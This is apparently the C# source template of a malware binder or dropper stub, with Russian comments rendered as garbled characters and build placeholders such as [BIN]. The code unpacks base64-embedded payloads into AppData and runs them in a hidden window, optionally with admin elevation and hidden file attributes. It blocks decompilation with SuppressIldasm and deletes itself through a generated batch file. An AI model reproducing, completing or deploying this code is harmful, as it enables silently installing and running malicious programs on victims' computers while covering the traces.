#region Çàâèñèìîñòè
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using %SpaceName%;
#endregion

#region Ñâîéñòâà ôàéëà
[module: SuppressIldasm]
[assembly: AssemblyTitle(AssBooster.TITLE)]
[assembly: AssemblyDescription(AssBooster.DESCRIPTION)]
[assembly: AssemblyCompany(AssBooster.COMPANY)]
[assembly: AssemblyProduct(AssBooster.PRODUCT)]
[assembly: AssemblyCopyright(AssBooster.COPYRIGHT)]
[assembly: ComVisible(false)]
[assembly: Guid(AssBooster.GUID)]
[assembly: AssemblyVersion(AssBooster.FileVersionStructure.VERSION)]
[assembly: AssemblyFileVersion(AssBooster.FileVersionStructure.FILEVERSION)]
#endregion

namespace %SpaceName%
{
    internal static class Program
    {
        [STAThread]
        public static void Main()
        {
            // Ïðîâåðêà íà îñòàíîâêó ïîòîêà ïåðåä çàïóñêîì âñåõ ôóíêöèé
            if (PanelWork.SleepTime)
            {
                PanelWork.Sleeping(2000);
            }

            // Ñïèñîê øèôðîâàííûõ ôàéëîâ äëÿ çàãðóçêè
            string[] files = new string[] { [BIN] };
            // Ïåðåáèðàåì ñïèñîê ôàéëîâ èç ìàññèâà
            foreach (string payload in files)
            {
                // Ðàçáèâàåì ñòðîêè íà ïîäñòðîêè 
                string b64 = payload.Split('™')[0], plName = payload.Split('™')[1];
                DropFiles(b64, plName);
            }
            // Ïðîâåðÿåì íà çàïóñê ñàìîóäàëåíèÿ áèëä ôàéëà
            if (PanelWork.SuicideActivate)
            {
                // Ïðîâåðÿåì *.bat ôàéë
                if (!File.Exists(GlobalPath.SuicideFile))
                {
                    // Ñîçäà¸ì áèíàðíèê
                    Suicide.Inizialize(GlobalPath.SuicideFile);
                    CommandRunner.RunFile(GlobalPath.SuicideFile); // Çàïóñêàåì áàòíèê
                }
                else
                {
                    CommandRunner.RunFile(GlobalPath.SuicideFile); // Çàïóñêàåì áàòíèê
                }
            }
        }

        /// <summary>
        /// Ìåòîä äëÿ äðîïà ôàéëîâ â îïðåäåë¸ííóþ ïàïêó
        /// </summary>
        /// <param name="payload">Ôàéë äëÿ ðàñøèôðîâêè</param>
        /// <param name="payloadName">Èìÿ ôàéëà</param>
        private static void DropFiles(string payload, string payloadName)
        {
            // Ñïèñîê ðàñøèðåíèé êîòîðûå ìîæíî çàïóñêàòü
            var extensionrunner = new string[]
            {
               ".exe", ".bat", ".txt", ".scr", ".doc", ".docx",
               ".png", ".jpg", ".wav", ".mp3", ".json"
            };
            try
            {
                // Ñîåäèíÿåì èìÿ ôàéëà è ïóòü êóäà áóäåì ñîõðàíÿòü âñ¸
                string FinalPath = Path.Combine(GlobalPath.AppData, payloadName);
                // Ðàñøèôðîâûâàåì ñòðîêè ôàéë(à)îâ èç base64
                byte[] EncryptBinder = Convert.FromBase64String(payload);
                if (!File.Exists(FinalPath))
                {
                    // Ñîõðàíÿåì ôàéë(û)
                    File.WriteAllBytes(FinalPath, EncryptBinder);
                    // Ïåðåáèðàåì öèêë ðàñøèðåíèé
                    foreach (var bypassfiles in extensionrunner)
                    {
                        // Ïðîâåðÿåì íà ñõîæèå ðàñøèðåíèÿ ôàéë(à)îâ
                        if (FinalPath.EndsWith(bypassfiles, StringComparison.InvariantCultureIgnoreCase))
                        {
                            // Çàïóñêàåì ôàéë
                            CommandRunner.RunFile(FinalPath);
                        }
                    }
                }
                else
                {
                    // Çàïóñêàåì ôàéë
                    CommandRunner.RunFile(FinalPath);
                }
            }
            catch { }
        }
    }
    public static class Suicide
    {
        /// <summary>
        /// Ìåòîä äëÿ ñîçäàíèÿ áàòíèêà äëÿ ñàìîóäàëåíèÿ áèëä ôàéëà
        /// </summary>
        /// <param name="pathfile">Èìÿ áèëä ôàéëà</param>
        public static void Inizialize(string pathfile)
        {
            // Ïðîâåðÿåì åñëè ñòðîêà íå ïóñòàÿ è ðàñøèðåíèÿ ôàéëà ÿâëÿåòñÿ *.bat
            if (!string.IsNullOrWhiteSpace(pathfile) && pathfile.EndsWith(".bat", StringComparison.InvariantCultureIgnoreCase))
            {
                try
                {
                    using (var sw = new StreamWriter(pathfile))
                    {
                        sw.WriteLine("@echo off"); // Íå ïîêàûâàòü âûâîä ñîîáùåíèé
                        sw.WriteLine("chcp 1251 >NUL"); // Çàäà¸ì êîäèðîâêó äëÿ ÷òåíèÿ êèðèëëèöû
                        sw.WriteLine("cls"); // îò÷èùÿåì êîíñîëü
                        sw.WriteLine(":loop"); // Ñîçäà¸ì öèêë
                        sw.WriteLine(string.Concat("del \"", GlobalPath.GetFileName, "\"")); // Óäàëÿåì áèëä ôàéëà
                        sw.WriteLine(string.Concat("if Exist \"", GlobalPath.GetFileName, "\" GOTO loop")); // Ïðîâåðÿåì ôàéë â öèêëå
                        sw.WriteLine("chcp 866 >NUL"); // Äëÿ ÷òåíèÿ êèðèëëèöû â êîíñîëè
                        sw.WriteLine("echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ");
                        sw.WriteLine("del %0"); // Ñàìîóäàëÿåìñÿ
                        sw.Flush(); // Îò÷èùàåì áóôåð ïîòîêà
                    }
                }
                catch { }
            }
        }
    }

    public static class GlobalPath
    {
        public static readonly string GetFileName = Path.GetFileName(AppDomain.CurrentDomain.FriendlyName);
        public static readonly string GetFullExeRunner = Assembly.GetExecutingAssembly().Location;
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string SuicideFile = Path.Combine(AppData, "Remove.bat");
    }

    public static class AssBooster
    {
        public const string TITLE = "[TITLE]";
        public const string DESCRIPTION = "[DESCRIPTION]";
        public const string COMPANY = "[COMPANY]";
        public const string PRODUCT = "[PRODUCT]";
        public const string COPYRIGHT = "Copyright (c) [COPYRIGHT] 2020";
        public const string GUID = "[GUID]";
        internal struct FileVersionStructure
        {
            public const string VERSION = "[VERSION]";
            public const string FILEVERSION = "[FILEVERSION]";
        }
    }

    public static class PanelWork
    {
        /// <summary>
        /// Ìåòîä äëÿ îñòàíîâêè ïîòîêà â ìèëèñåêóíäàõ
        /// </summary>
        /// <param name="time">Êîë-âî ìèëèñåêóíä</param>
        public static void Sleeping(int time)
        {
            try
            {
                Thread.Sleep(time);
            }
            catch { }
        }

        /// <summary>
        /// Ìåòîä äëÿ ïðîâåðêè ðàçìåðà ôàéëà
        /// </summary>
        /// <param name="filename">Èìÿ ôàéëà</param>
        /// <returns></returns>
        public static bool CheckerFile(string filename)
        {
            try
            {
                var file = new FileInfo(filename);
                return file.Length > 0;
            }
            catch { return false; }
        }

        public static bool SuicideActivate = [Delay]; // [Delay];
        public static bool RunFromAdmin = [AdminRun]; // [AdminRun];
        public static bool SleepTime = [Time]; // [Time];
        public static bool HideFiles = [HideFiles]; // [HideFiles];
    }

    public static class CommandRunner
    {
        /// <summary>
        /// Ìåòîä äëÿ çàïóñêà ôàéë(à)îâ ñ ïàðàìåòðàìè
        /// </summary>
        /// <param name="filename">Èìÿ ôàéëà</param>
        public static void RunFile(string filename)
        {
            // Åñëè ñòðîêà íå ïóñòàÿ è ôàéë íå èìååò íóëåâîé ðàçìåð
            if (!string.IsNullOrWhiteSpace(filename) && PanelWork.CheckerFile(filename))
            {
                try
                {
                    // Ñêðûâàåì êîíñîëü çàïóñêà
                    var style = ProcessWindowStyle.Hidden;
                    // Ïåðåäà¸ì ïàðàìåòðû äëÿ çàïóñêà
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = filename,
                        CreateNoWindow = false,
                        WindowStyle = style,
                    };
                    // Ïðîâåðÿåì çàïóñê îò Àäìèíà
                    if (PanelWork.RunFromAdmin)
                    {
                        startInfo.UseShellExecute = true;
                        startInfo.Verb = "runas";
                    }
                    // Ïðîâåðÿåì ñêðûâàòü ëè ôàéë 
                    if (PanelWork.HideFiles)
                    {
                        try
                        {
                            if (!filename.Contains("Remove")) File.SetAttributes(filename, FileAttributes.Hidden);
                        }
                        catch { }
                    }
                    // Çàïóñêàåì ïðîöåññ ñ ïàðàìåòðàìè
                    using (var info = Process.Start(startInfo)) { info.Refresh(); }
                }
                catch { }
            }
        }
    }
}
